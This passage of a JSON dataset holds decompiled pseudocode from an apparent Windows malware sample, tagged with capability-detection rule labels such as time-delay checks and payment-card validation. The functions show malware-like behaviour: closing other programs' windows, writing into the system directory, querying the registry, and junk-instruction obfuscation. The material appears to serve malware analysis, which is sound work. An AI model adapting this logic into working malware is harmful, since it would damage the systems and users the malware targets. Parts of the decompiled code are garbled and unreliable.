func_0x6a401a29();\n    uVar10 = (uVar50 >> 0x20) + *0xdf53;\n    *(puVar12 + -4) = uVar50;\n    *(puVar12 + -8) = uVar50 >> 0x20 & 0xffffff00 | uVar10;\n    pcVar7 = _sym.imp.USER32.dll_SendMessageTimeoutA;\n    puVar13 = puVar12 + -0xc;\n    *(puVar12 + -0xc) = 0x401a31;\n    (*pcVar7)();\n    *(puVar13 + -4) = extraout_ECX;\n    *(puVar13 + -4) = 0x407418;\n    *(puVar13 + -8) = puVar47;\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    puVar14 = puVar13 + -0xc;\n    *(puVar13 + -0xc) = 0x401a52;\n    pcVar7 = (*pcVar7)();\n    uVar2 = *0x8be181b8;\n    if (pcVar7 == 0xdf00) {\n        *in_FS_OFFSET = *0x8be181c4;\n        return 1;\n    }\n    *0x8be181b0 = 0xdf00;\n    *(puVar14 + -4) = 0x8be181b0;\n    *(puVar14 + -8) = 0xdf00;\n    *(puVar14 + -0xc) = str._D_3;\n    *(puVar14 + -0x10) = uVar2;\n    *0x8be181cc = 0xdf00;\n    puVar15 = puVar14 + -0x14;\n    *(puVar14 + -0x14) = 0x401a82;\n    iVar6 = (*pcVar7)();\n    piVar4 = *0x8be181b0;\n    if ((iVar6 < 0xdf00) || (*0x8be181b0 == 0xdf00)) {\n        *0x8be181cc = 0xffffffff;\n        if (*0x8be181b0 != 0xdf00) {\n            iVar8 = **0x8be181b0;\n            *(puVar15 + -4) = *0x8be181b0;\n            pcVar7 = *(iVar8 + 8);\n            puVar46 = puVar15 + -8;\n            puVar15 = puVar15 + -8;\n            *puVar46 = 0x401e5d;\n            (*pcVar7)();\n        }\n    }\n    else {\n        *0x8be181ac = 0xdf00;\n        iVar6 = **0x8be181b0;\n        *(puVar15 + -4) = 0x8be181ac;\n        *(puVar15 + -8) = piVar4;\n        *0x8be181cc = 1;\n        pcVar7 = *(iVar6 + 0x20);\n        puVar16 = puVar15 + -0xc;\n        puVar15 = puVar15 + -0xc;\n        *puVar16 = 0x401aa8;\n        iVar6 = (*pcVar7)();\n        piVar4 = *0x8be181ac;\n        if ((iVar6 < 0xdf00) || (*0x8be181ac == 0xdf00)) {\n            *0x8be181cc = *0x8be181cd << 8;\n            if (*0x8be181ac != 0xdf00) {\n                iVar8 = **0x8be181ac;\n                *(puVar15 + -4) = *0x8be181ac;\n                pcVar7 = *(iVar8 + 8);\n                puVar44 = puVar15 + -8;\n                puVar15 = puVar15 + -8;\n                *puVar44 = 0x401e36;\n                (*pcVar7)();\n            }\n            *0x8be181cc = 0xffffffff;\n            if (*0x8be181b0 != 0xdf00) {\n                iVar8 = **0x8be181b0;\n                *(puVar15 + -4) = *0x8be181b0;\n                pcVar7 = *(iVar8 + 8);\n                puVar45 = puVar15 + -8;\n                puVar15 = puVar15 + -8;\n                *puVar45 = 0x401e4a;\n                (*pcVar7)();\n            }\n        }\n        else {\n            *0x8be181b4 = 0xdf00;\n            iVar8 = **0x8be181ac;\n            *(puVar15 + -4) = 0x8be181b4;\n            *(puVar15 + -8) = piVar4;\n            pcVar7 = *(iVar8 + 0x24);\n            puVar17 = puVar15 + -0xc;\n            puVar15 = puVar15 + -0xc;\n            *puVar17 = 0x401aca;\n            (*pcVar7)();\n            *0x8be18190 = 0xdf00;\n            if (0xdf00 < *0x8be181b4) {\n                do {\n                    pcVar7 = _sym.imp.MSVCRT.dll_rand;\n                    puVar18 = puVar15 + -4;\n                    *(puVar15 + -4) = 0x401ade;\n                    iVar8 = (*pcVar7)();\n                    uVar3 = *0x8be181a0;\n                    iVar8 = iVar8 % *0x8be181b4;\n                    *0x8be1819c = CONCAT22(*0x8be1819e, 3);\n                    *0x8be181a4 = iVar8;\n                    *0x8be181c0 = piVar11;\n                    *0x8be181d8 = piVar11;\n                    *(puVar18 + -4) = 0x8be181d8;\n                    piVar11 = *0x8be181ac;\n                    uVar2 = *0x8be1819c;\n                    iVar6 = **0x8be181ac;\n                    *0x8be181cc = 4;\n                    *(puVar18 + -0x14) = *0x8be1819c;\n                    *(puVar18 + -0x10) = uVar3;\n                    uVar3 = *0x8be181a8;\n                    *(puVar18 + -0xc) = iVar8;\n                    *(puVar18 + -8) = uVar3;\n                    *(puVar18 + -0x28) = piVar11;\n                    *(puVar18 + -0x24) = uVar2;\n                    *(puVar18 + -0x20) = *0x8be181a0;\n                    *(puVar18 + -0x1c) = iVar8;\n                    *(puVar18 + -0x18) = uVar3;\n                    pcVar7 = *(iVar6 + 0x2c);\n                    puVar5 = puVar18 + -0x2c;\n                    *(puVar18 + -0x2c) = 0x401b30;\n                    iVar6 = (*pcVar7)();\n                    piVar4 = *0x8be181d8;\n                    piVar11 = NULL;\n                    if ((iVar6 < 0) || (*0x8be181d8 == NULL)) {\n                        *0x8be181cc = 3;\n                        if (*0x8be181c0 != NULL) {\n                            iVar8 = **0x8be181c0;\n                            *(puVar5 + -4) = *0x8be181c0;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar39 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar39 = 0x401dc7;\n                            (*pcVar7)();\n                        }\njoined_r0x00401dd0:\n                        *0x8be181cc = 2;\n                        if (*0x8be181d8 != NULL) {\n                            *0x8be181cc = 2;\n                            iVar8 = **0x8be181d8;\n                            *(puVar5 + -4) = *0x8be181d8;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar40 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar40 = 0x401dd8;\n                            (*pcVar7)();\n                        }\n                        *(puVar5 + -4) = 0x8be1819c;\ncode_r0x00401ddc:\n                        pcVar7 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                        puVar15 = puVar5 + -8;\n                        *(puVar5 + -8) = 0x401de2;\n                        (*pcVar7)();\n                        break;\n                    }\n                    ppcVar1 = **0x8be181d8;\n                    *(puVar5 + -4) = 0x8be181c0;\n                    *(puVar5 + -8) = 0x4061b0;\n                    *(puVar5 + -0xc) = piVar4;\n                    pcVar7 = *ppcVar1;\n                    puVar19 = puVar5 + -0x10;\n                    puVar5 = puVar5 + -0x10;\n                    *puVar19 = 0x401b55;\n                    iVar6 = (*pcVar7)();\n                    piVar4 = *0x8be181c0;\n                    if ((iVar6 < 0) || (*0x8be181c0 == NULL)) {\njoined_r0x00401d97:\n                        if (*0x8be181c0 != NULL) {\n                            *0x8be181cc = 3;\n                            iVar8 = **0x8be181c0;\n                            *(puVar5 + -4) = *0x8be181c0;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar37 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar37 = 0x401d9f;\n                            (*pcVar7)();\n                        }\n                        *0x8be181cc = 2;\n                        if (*0x8be181d8 != NULL) {\n                            iVar8 = **0x8be181d8;\n                            *(puVar5 + -4) = *0x8be181d8;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar38 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar38 = 0x401db0;\n                            (*pcVar7)();\n                        }\n                        *(puVar5 + -4) = 0x8be1819c;\n                        goto code_r0x00401ddc;\n                    }\n                    iVar6 = **0x8be181c0;\n                    *(puVar5 + -4) = 0x8be18198;\n                    *(puVar5 + -8) = piVar4;\n                    pcVar7 = *(iVar6 + 0x38);\n                    puVar20 = puVar5 + -0xc;\n                    puVar5 = puVar5 + -0xc;\n                    *puVar20 = 0x401b74;\n                    iVar6 = (*pcVar7)();\n                    iVar8 = *0x8be18198;\n                    if (iVar6 < 0) goto joined_r0x00401d97;\n                    if (*0x8be18198 == 0) {\njoined_r0x00401bd3:\n                        if (*0x8be181c0 != NULL) {\n                            *0x8be181cc = 3;\n                            iVar8 = **0x8be181c0;\n                            *(puVar5 + -4) = *0x8be181c0;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar23 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar23 = 0x401bdb;\n                            (*pcVar7)();\n                        }\n                        *0x8be181cc = 2;\n                        if (*0x8be181d8 != NULL) {\n                            iVar8 = **0x8be181d8;\n                            *(puVar5 + -4) = *0x8be181d8;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar24 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar24 = 0x401bec;\n                            (*pcVar7)();\n                        }\n                        *(puVar5 + -4) = 0x8be1819c;\n                    }\n                    else {\n                        *(puVar5 + -4) = 0x104;\n                        *(puVar5 + -8) = 0x8be17f84;\n                        *(puVar5 + -0xc) = iVar8;\n                        *(puVar5 + -0x10) = 0x401ba4;\n                        fcn.004017c0();\n                        *(puVar5 + -4) = *0x8be18198;\n                        pcVar7 = _sym.imp.OLEAUT32.dll_SysStringLen;\n                        puVar21 = puVar5 + -8;\n                        *(puVar5 + -8) = 0x401bb1;\n                        (*pcVar7)();\n                        *(puVar21 + -4) = 0x40742c;\n                        *(puVar21 + -8) = 0x8be17f84;\n                        pcVar7 = _sym.imp.MSVCRT.dll__stricmp;\n                        puVar22 = puVar21 + -0xc;\n                        *(puVar21 + -0xc) = 0x401bc3;\n                        iVar8 = (*pcVar7)();\n                        piVar4 = *0x8be181d8;\n                        puVar5 = puVar22 + 2;\n                        if (iVar8 != 0) goto joined_r0x00401bd3;\n                        *0x8be181bc = NULL;\n                        puVar22[1] = 0x8be181bc;\n                        *puVar22 = 0x4061a0;\n                        ppcVar1 = *piVar4;\n                        puVar22[-1] = piVar4;\n                        *0x8be181cc = 5;\n                        pcVar7 = *ppcVar1;\n                        puVar5 = puVar22 + -2;\n                        puVar22[-2] = 0x401c0d;\n                        iVar6 = (*pcVar7)();\n                        piVar4 = *0x8be181bc;\n                        if ((iVar6 < 0) || (*0x8be181bc == NULL)) {\n                            *0x8be181cc = 4;\n                            if (*0x8be181bc != NULL) {\n                                iVar8 = **0x8be181bc;\n                                *(puVar5 + -4) = *0x8be181bc;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar35 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar35 = 0x401d73;\n                                (*pcVar7)();\n                            }\njoined_r0x00401d7c:\n                            if (*0x8be181c0 != NULL) {\n                                *0x8be181cc = 3;\n                                iVar8 = **0x8be181c0;\n                                *(puVar5 + -4) = *0x8be181c0;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar36 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar36 = 0x401d84;\n                                (*pcVar7)();\n                            }\n                            goto joined_r0x00401dd0;\n                        }\n                        iVar6 = **0x8be181bc;\n                        *(puVar5 + -4) = 0x8be18194;\n                        *(puVar5 + -8) = piVar4;\n                        pcVar7 = *(iVar6 + 0x20);\n                        puVar25 = puVar5 + -0xc;\n                        puVar5 = puVar5 + -0xc;\n                        *puVar25 = 0x401c2c;\n                        iVar6 = (*pcVar7)();\n                        iVar8 = *0x8be18194;\n                        if (iVar6 < 0) {\n                            *0x8be181cc = 4;\n                            if (*0x8be181bc != NULL) {\n                                iVar8 = **0x8be181bc;\n                                *(puVar5 + -4) = *0x8be181bc;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar32 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar32 = 0x401d26;\n                                (*pcVar7)();\n                            }\n                            goto joined_r0x00401d7c;\n                        }\n                        if (*0x8be18194 == 0) {\n                            *0x8be181cc = 4;\n                            if (*0x8be181bc != NULL) {\n                                iVar8 = **0x8be181bc;\n                                *(puVar5 + -4) = *0x8be181bc;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar26 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar26 = 0x401c4e;\n                                (*pcVar7)();\n                            }\n                            *0x8be181cc = 3;\n                            if (*0x8be181c0 != NULL) {\n                                iVar8 = **0x8be181c0;\n                                *(puVar5 + -4) = *0x8be181c0;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar27 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar27 = 0x401c5f;\n                                (*pcVar7)();\n                            }\n                        }\n                        else {\n                            *0x8be18088 = 0;\n                            puVar47 = 0x8be18089;\n                            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                                *puVar47 = 0;\n                                puVar47 = puVar47 + 1;\n                            }\n                            *puVar47 = 0;\n                            *(puVar47 + 2) = 0;\n                            *(puVar5 + -4) = 0x104;\n                            *(puVar5 + -8) = 0x8be18088;\n                            *(puVar5 + -0xc) = iVar8;\n                            *(puVar5 + -0x10) = 0x401c9a;\n                            fcn.004017c0();\n                            *(puVar5 + -4) = *0x8be18194;\n                            pcVar7 = _sym.imp.OLEAUT32.dll_SysStringLen;\n                            puVar28 = puVar5 + -8;\n                            *(puVar5 + -8) = 0x401ca7;\n                            (*pcVar7)();\n                            *(puVar28 + -4) = 0x8be18088;\n                            *(puVar28 + -8) = 0x401cb3;\n                            iVar8 = fcn.004018e0(*(puVar28 + -4));\n                            if (iVar8 == 0) {\n                                *(puVar28 + -4) = 10;\n                                pcVar7 = _sym.imp.KERNEL32.dll_Sleep;\n                                puVar33 = puVar28 + -8;\n                                *(puVar28 + -8) = 0x401d3b;\n                                (*pcVar7)();\n                                piVar4 = *0x8be181c0;\n                                *(puVar33 + -4) = *0x8be181c0;\n                                pcVar7 = *(*piVar4 + 0x114);\n                                puVar5 = puVar33 + -8;\n                                *(puVar33 + -8) = 0x401d47;\n                                (*pcVar7)();\n                                *0x8be181cc = 4;\n                                if (*0x8be181bc != NULL) {\n                                    iVar8 = **0x8be181bc;\n                                    *(puVar5 + -4) = *0x8be181bc;\n                                    pcVar7 = *(iVar8 + 8);\n                                    puVar34 = puVar5 + -8;\n                                    puVar5 = puVar5 + -8;\n                                    *puVar34 = 0x401d58;\n                                    (*pcVar7)();\n                                }\n                                goto joined_r0x00401d97;\n                            }\n                            *(puVar28 + -4) = 0;\n                            pcVar7 = _sym.imp.KERNEL32.dll_Sleep;\n                            puVar5 = puVar28 + -8;\n                            *(puVar28 + -8) = 0x401cc1;\n                            (*pcVar7)();\n                            *0x8be181cc = 4;\n                            if (*0x8be181bc != NULL) {\n                                iVar8 = **0x8be181bc;\n                                *(puVar5 + -4) = *0x8be181bc;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar29 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar29 = 0x401cd2;\n                                (*pcVar7)();\n                            }\n                            *0x8be181cc = 3;\n                            if (*0x8be181c0 != NULL) {\n                                iVar8 = **0x8be181c0;\n                                *(puVar5 + -4) = *0x8be181c0;\n                                pcVar7 = *(iVar8 + 8);\n                                puVar30 = puVar5 + -8;\n                                puVar5 = puVar5 + -8;\n                                *puVar30 = 0x401ce3;\n                                (*pcVar7)();\n                            }\n                        }\n                        *0x8be181cc = 2;\n                        if (*0x8be181d8 != NULL) {\n                            *0x8be181cc = 2;\n                            iVar8 = **0x8be181d8;\n                            *(puVar5 + -4) = *0x8be181d8;\n                            pcVar7 = *(iVar8 + 8);\n                            puVar31 = puVar5 + -8;\n                            puVar5 = puVar5 + -8;\n                            *puVar31 = 0x401cf4;\n                            (*pcVar7)();\n                        }\n                        *(puVar5 + -4) = 0x8be1819c;\n                    }\n                    pcVar7 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                    puVar15 = puVar5 + -8;\n                    *(puVar5 + -8) = 0x401cfe;\n                    (*pcVar7)();\n                    *0x8be18190 = *0x8be18190 + 1;\n                } while (*0x8be18190 < *0x8be181b4);\n            }\n            *0x8be181cc = 0;\n            if (*0x8be181ac != piVar11) {\n                iVar8 = **0x8be181ac;\n                *(puVar15 + -4) = *0x8be181ac;\n                pcVar7 = *(iVar8 + 8);\n                puVar41 = puVar15 + -8;\n                puVar15 = puVar15 + -8;\n                *puVar41 = 0x401df2;\n                (*pcVar7)();\n            }\n            *0x8be181cc = 0xffffffff;\n            puVar47 = *0x8be1818c;\n            if (*0x8be181b0 != piVar11) {\n                iVar8 = **0x8be181b0;\n                *(puVar15 + -4) = *0x8be181b0;\n                pcVar7 = *(iVar8 + 8);\n                puVar42 = puVar15 + -8;\n                puVar15 = puVar15 + -8;\n                *puVar42 = 0x401e06;\n                (*pcVar7)();\n                puVar47 = *0x8be1818c;\n            }\n        }\n    }\n    *(puVar15 + -4) = puVar47;\n    pcVar7 = _sym.imp.KERNEL32.dll_FreeLibrary;\n    puVar43 = puVar15 + -8;\n    *(puVar15 + -8) = 0x401e10;\n    (*pcVar7)();\n    pcVar7 = _sym.imp.ole32.dll_CoUninitialize;\n    *(puVar43 + -4) = 0x401e16;\n    (*pcVar7)();\n    *in_FS_OFFSET = *0x8be181c4;\n    return iVar6;\n}\n",
        "token_count": 6394
    },
    "00401ef0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f90) overlaps instruction at (ram,0x00401f8c)\n// \n// WARNING: Removing unreachable block (ram,0x00401f84)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401ef0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t extraout_CH;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint *puVar3;\n    ulong uVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar3 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    uVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    puVar2 = uVar4 >> 0x20;\n    if (uVar4 == 0) {\n        *puVar2 = *puVar2 | extraout_CH;\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x401e70, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 466
    },
    "00402250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402250(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00404460();\n        fcn.00402ec0();\n        fcn.00401fe0();\n        if (*0x425578 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402cb0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 160
    },
    "00403350": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004033a7) overlaps instruction at (ram,0x004033a5)\n// \n\nbool __cdecl fcn.00403350(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    int16_t in_DX;\n    uint *puVar3;\n    bool bVar4;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = (puVar3 + 2 + 1U & in_DX + 0x1abU) < 0;\n    fcn.00403720();\n    if ((!bVar4) && (bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004050d0();\n        arg_ch_01 = fcn.004050d0();\n        arg_ch_02 = fcn.004050d0();\n        fcn.00405070(arg_10h, arg_ch_00);\n        fcn.00405070(arg_8h, arg_ch_01);\n        fcn.00405070(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402860(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402860(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402860(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00405070(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 727
    },
    "004034c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403544)\n// WARNING: Removing unreachable block (ram,0x0040354d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004034c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    bool in_OF;\n    uint hKey;\n    \n    if ((!in_OF) && (in_OF)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 280
    },
    "004037e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004037e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uVar3;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar3 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407024, &lpBuffer, arg_8h);\n    if ((!uVar3) && (uVar3)) {\n        LOCK();\n    }\n    fcn.00404220(&var_4h, &var_8h);\n    fcn.00403920(var_4h);\n    iVar1 = fcn.00402970(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403ae0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 436
    },
    "00404040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004041d7) overlaps instruction at (ram,0x004041d5)\n// \n// WARNING: Removing unreachable block (ram,0x004041d4)\n// WARNING: Removing unreachable block (ram,0x004041e6)\n\nvoid __cdecl fcn.00404040(uint8_t *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint in_EAX;\n    uint32_t uVar6;\n    uint in_ECX;\n    ushort in_DX;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uchar in_CF;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    bool in_SF;\n    bool bVar9;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar10;\n    uint8_t in_NT;\n    float10 in_ST0;\n    uchar uStackY20;\n    uchar uStackY19;\n    ushort uStackY18;\n    ushort uVar11;\n    ushort uStack14;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        in_CF = *(unaff_ESI + 4) < *(unaff_EDI + 4);\n    }\n    *arg_8h = 0xfd;\n    if ((!in_CF) && (in_CF)) {\n        uVar5 = in_EAX;\n        cVar1 = uVar5 - *arg_8h;\n        func_0x10189fe7((in_NT & 1) * 0x4000 | SBORROW1(uVar5, *arg_8h) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar5 < *arg_8h);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_8h[1] = 0x96;\n    arg_8h[2] = 0xaa;\n    arg_8h[3] = 0xc0;\n    uStack14 = in_EAX >> 0x10;\n    uStackY20 = in_ECX;\n    uStackY19 = in_ECX >> 8;\n    uStackY18 = in_ECX >> 0x10;\n    uVar11 = in_EAX;\ncode_r0x004040b8:\n    uVar3 = CONCAT11(uStackY19, uStackY20);\n    iVar2 = CONCAT22(uStackY18, uVar3);\n    uVar6 = CONCAT22(uStack14, uVar11);\n    arg_8h[4] = 0xbc;\n    do {\n        uStackY20 = SUB41(arg_8h, 0);\n        uStackY19 = arg_8h >> 8;\n        uStackY18 = arg_8h >> 0x10;\n        bVar7 = false;\n        bVar10 = false;\n        bVar9 = false;\n        arg_8h[5] = 0x7f;\n        uVar4 = uVar6 & 0x11cb;\n        while( true ) {\n            bVar8 = uVar4 == 0;\n            arg_8h[6] = 0xc0;\n            if ((!bVar8 && bVar10 == bVar9) && (bVar8 || bVar10 != bVar9)) {\n                in_AF = 9 < (uVar6 & 0xf) | in_AF;\n                uVar11 = in_DX;\n                uStack14 = uVar3;\n                if (iVar2 != 0) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                goto code_r0x004040b8;\n            }\n            arg_8h[7] = 0x4d;\n            if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n                bVar7 = false;\n                bVar10 = false;\n                uVar6 = uVar6 & 0xe2f4cc58;\n                bVar9 = uVar6 < 0;\n                bVar8 = uVar6 == 0;\n            }\n            arg_8h[8] = 0xe6;\n            if ((!bVar8 && bVar10 == bVar9) && (bVar8 || bVar10 != bVar9)) break;\n            arg_8h[9] = 0xcf;\n            if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n                uVar6 = uVar6 & 0xe2f4cc58;\n            }\n            arg_8h[10] = 0xa5;\n            uVar5 = uVar6;\n            arg_8h[0xb] = 0x61;\n            if ((uVar5 < '\\x02') || ('\\x01' < uVar5)) {\n                arg_8h[0xc] = 0xa6;\n                arg_8h[0xd] = 0xd7;\n                arg_8h[0xe] = 0xf9;\n                arg_8h[0xf] = 0x66;\n                *arg_ch = 0x10;\n                return;\n            }\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar6 = uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            if (iVar2 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            LOCK();\n            bVar7 = 0x9a70ae80 < uVar6;\n            bVar10 = SCARRY4(uVar6, 0x658f517f);\n            uVar6 = uVar6 + 0x658f517f;\n            bVar9 = uVar6 < 0;\n            uVar4 = uVar6;\n        }\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        uVar6 = uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f;\n        if (iVar2 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 1579
    },
    "00404220": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
